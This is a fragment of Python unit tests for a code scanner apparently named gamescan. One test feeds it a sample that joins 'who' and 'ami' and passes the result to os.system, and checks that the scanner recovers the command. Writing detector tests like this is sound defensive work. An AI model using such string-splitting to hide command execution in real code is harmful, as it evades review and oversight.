        self.assertTrue([f for f in active(found, "LOL-001") if "decoded at line 5" in f.evidence])

    # -- reporting ------------------------------------------------------------------------
    def test_report_format_only_gained_values(self):
        from gamescan.models import ScanReport
        src = 'import os\nc = "who" + "ami"\nos.system(c)\n'
        report = ScanReport(target="x")
        report.findings = self.s.scan_bytes("game/a.py", src.encode())
        entry = [f for f in report.to_dict()["findings"] if f["rule_id"] == "DF-CMD-001"][0]
        self.assertEqual(entry["snippet"], "whoami")
